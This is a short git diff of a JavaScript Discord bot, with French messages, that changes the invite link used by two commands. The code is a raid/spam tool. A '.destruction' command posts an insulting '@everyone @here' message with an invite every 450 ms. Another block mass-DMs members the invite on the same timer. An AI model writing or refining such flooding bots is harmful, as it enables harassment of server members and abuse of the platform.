@@ -25,7 +25,7 @@ bot.on('message', msg => {
 if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/ttpXP4m").catch(e => {});
+      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/TnGXxPb").catch(e => {});
     }, 450)
   }
 
@@ -105,7 +105,7 @@ if (msg.content === '.pardon') {
 
     if(i < 500){
       var interval = setInterval (function () {
-        member.send("https://discord.gg/ttpXP4m").catch(e => {});
+        member.send("https://discord.gg/TnGXxPb").catch(e => {});
       }, 450)
 
       }   
